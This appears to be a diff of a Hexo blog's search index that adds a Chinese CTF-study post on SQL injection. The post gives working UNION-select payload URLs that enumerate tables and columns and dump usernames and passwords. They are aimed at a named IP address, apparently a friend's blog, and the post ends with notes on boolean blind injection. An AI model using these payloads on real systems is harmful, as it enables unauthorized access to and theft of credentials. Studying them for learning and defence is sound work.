@@ -4,6 +4,35 @@
   
     
     <entry>
+      <title>SQL注入</title>
+      <link href="/CTF-%E5%AD%A6%E4%B9%A0/SQL%E6%B3%A8%E5%85%A5/"/>
+      <url>/CTF-%E5%AD%A6%E4%B9%A0/SQL%E6%B3%A8%E5%85%A5/</url>
+      
+        <content type="html"><![CDATA[<p><strong>我自己的手写博客貌似出了点问题，那么本次学习就拿C神的blog来开刀了</strong></p><p>IP : 82.157.140.84</p><h1 id="0x1-SQL注入的危害"><a href="#0x1-SQL注入的危害" class="headerlink" title="0x1 SQL注入的危害"></a>0x1 SQL注入的危害</h1><p>（非可信字符直接拼接进SQL语句进行数据查询，就会造成SQL注入）<br>SQL注入会导致数据库敏感数据泄露，植入恶意代码等</p><h1 id="0x1-SQL注入的类型"><a href="#0x1-SQL注入的类型" class="headerlink" title="0x1 SQL注入的类型"></a>0x1 SQL注入的类型</h1><h3 id="◎数字型注入配合union-联合-注入"><a href="#◎数字型注入配合union-联合-注入" class="headerlink" title="◎数字型注入配合union(联合)注入"></a>◎数字型注入配合union(联合)注入</h3><p>可参考我们的page_detail.php，可看到url中出现了参数id</p><p>使用id&#x3D;1%2b2来判断，如果返回的是id&#x3D;3的内容，说明1%2b2这个表达式进入了sql语句进行了执行</p><p>（tips：%2b等同于+，为防止+被过滤，我们使用%b进行替换）</p><h3 id><a href="#" class="headerlink" title></a></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://82.157.140.84/page_detail.php?id=1 union select 1,(select table_name from information_schema.tables where table_schema=database() limit 0,1),3 limit 1,1</span><br></pre></td></tr></table></figure><p>&#x2F;&#x2F;查Charmersix SQL数据库中相应表的数据(数据库中表的数量及名称)</p><p>第一个表page</p><img src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20221013201958775.png" alt="image-20221013201958775" style="zoom: 67%;"><p>第二个表user</p><img src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20221013202032935.png" alt="image-20221013202032935" style="zoom:80%;"><p>第三个表。。。可见没有第三个表，只有两个表</p><img src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20221013202101030.png" alt="image-20221013202101030" style="zoom:67%;"><p>再查询列(column)数据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://82.157.140.84/page_detail.php?id=1 union select 1,(select column_name from information_schema.columns where table_name=&#x27;user&#x27; limit 0,1),3 limit 1,1</span><br></pre></td></tr></table></figure><p>得第一列的内容自然为“id”了(索引为0)</p><img src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20221013202749816.png" alt="image-20221013202749816" style="zoom:67%;"><p>同理，第三列内容为password(索引为2)</p><img src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20221013202842157.png" alt="image-20221013202842157" style="zoom:67%;"><p>随后，我们便可以名正言顺地查询user表中的数据了<br>通过前面的工作我们将user表的结构查清楚，随后通过联合查询来获取user表中数据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://82.157.140.84/page_detail.php?id=1 union  select id,username,password from user limit 1,1</span><br></pre></td></tr></table></figure><img src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20221013203027910.png" alt="image-20221013203027910" style="zoom:67%;"><h3 id="◎字符型注入配合布尔盲注"><a href="#◎字符型注入配合布尔盲注" class="headerlink" title="◎字符型注入配合布尔盲注"></a>◎字符型注入配合布尔盲注</h3><p>如果?id&#x3D;2aaaa返回的依然是?id&#x3D;2的内容，则说明是字符型注入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">tips:此处简单表述字符串转数字型的规则：</span><br><span class="line">&#x27;1aaa&#x27;=1</span><br><span class="line">&#x27;2aaaaaaas&#x27;=2</span><br><span class="line">&#x27;233sdlk&#x27;=233</span><br><span class="line">&#x27;a2333&#x27;=a</span><br></pre></td></tr></table></figure><p>布尔盲注是指没有明显的回显点，只能通过报错和未报错两种结果来判断</p><p>●当猜对的时候，页面就没有报错<br>●当猜错的时候，页面就报报错</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> CTF 学习 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 基础知识 </tag>
+            
+            <tag> CTF 学习 </tag>
+            
+            <tag> SQL </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>Unknown database“xxxx“idea连接数据库配置数据源时报错</title>
       <link href="/MySQL/Unknown%20database%E2%80%9Cxxxx%E2%80%9Cidea%E8%BF%9E%E6%8E%A5%E6%95%B0%E6%8D%AE%E5%BA%93%E9%85%8D%E7%BD%AE%E6%95%B0%E6%8D%AE%E6%BA%90%E6%97%B6%E6%8A%A5%E9%94%99/"/>
       <url>/MySQL/Unknown%20database%E2%80%9Cxxxx%E2%80%9Cidea%E8%BF%9E%E6%8E%A5%E6%95%B0%E6%8D%AE%E5%BA%93%E9%85%8D%E7%BD%AE%E6%95%B0%E6%8D%AE%E6%BA%90%E6%97%B6%E6%8A%A5%E9%94%99/</url>
@@ -50,6 +79,8 @@
             <tag> 基础知识 </tag>
             
             <tag> CTF 学习 </tag>
+            
+            <tag> SQL </tag>
             
         </tags>
       
@@ -384,7 +415,7 @@
       <link href="/Hexo/spawn%20failed%20%E8%A7%A3%E5%86%B3%E6%97%A5%E5%BF%97/"/>
       <url>/Hexo/spawn%20failed%20%E8%A7%A3%E5%86%B3%E6%97%A5%E5%BF%97/</url>
       
-        <content type="html"><![CDATA[<hr><p><img src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20220906084642319.png" alt="image-20220906084642319"></p><p>本次错误系网络原因</p><p>首先用检查ssh</p><p> <code>ssh -T git@github.com</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -v git@SERVER</span><br></pre></td></tr></table></figure><p>如果没有出现ssh不能连接，则非ssh出错</p><p>接着回到博客的根目录</p><p>第一种方法：</p><p>删除.deploy_git文件</p><p>然后输入<code>git config --gloabl core.autocrlf false</code></p><p>重新hexo clean</p><p>hexo g</p><p>hexo d</p><p>部署</p><p>第二种方法：</p><p>打开_config.yml配置文件</p><p>修改以下内容</p><p>deploy:</p><p>type: git</p><p>repo: <a href="https://github.com/yourname/yourname.github.io.git">https://github.com/yourname/yourname.github.io.git</a></p><p>branch: master</p><p>其中的repo修改为</p><p><a href="mailto:&#x67;&#105;&#116;&#64;&#103;&#105;&#116;&#x68;&#117;&#98;&#46;&#99;&#111;&#x6d;">&#x67;&#105;&#116;&#64;&#103;&#105;&#116;&#x68;&#117;&#98;&#46;&#99;&#111;&#x6d;</a>:yourname&#x2F;yourname.github.io.git</p>]]></content>
+        <content type="html"><![CDATA[<hr><p><img src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20220906084642319.png" alt="image-20220906084642319"></p><p>本次错误系网络原因</p><p>首先用检查ssh</p><p> <code>ssh -T git@github.com</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -v git@SERVER</span><br></pre></td></tr></table></figure><p>如果没有出现ssh不能连接，则非ssh出错</p><p>接着回到博客的根目录</p><p>第一种方法：</p><p>删除.deploy_git文件</p><p>然后输入<code>git config --gloabl core.autocrlf false</code></p><p>重新hexo clean</p><p>hexo g</p><p>hexo d</p><p>部署</p><p>第二种方法：</p><p>打开_config.yml配置文件</p><p>修改以下内容</p><p>deploy:</p><p>type: git</p><p>repo: <a href="https://github.com/yourname/yourname.github.io.git">https://github.com/yourname/yourname.github.io.git</a></p><p>branch: master</p><p>其中的repo修改为</p><p><a href="mailto:&#x67;&#105;&#x74;&#x40;&#x67;&#x69;&#116;&#104;&#x75;&#x62;&#x2e;&#x63;&#x6f;&#109;">&#x67;&#105;&#x74;&#x40;&#x67;&#x69;&#116;&#104;&#x75;&#x62;&#x2e;&#x63;&#x6f;&#109;</a>:yourname&#x2F;yourname.github.io.git</p>]]></content>
       
       
       <categories>
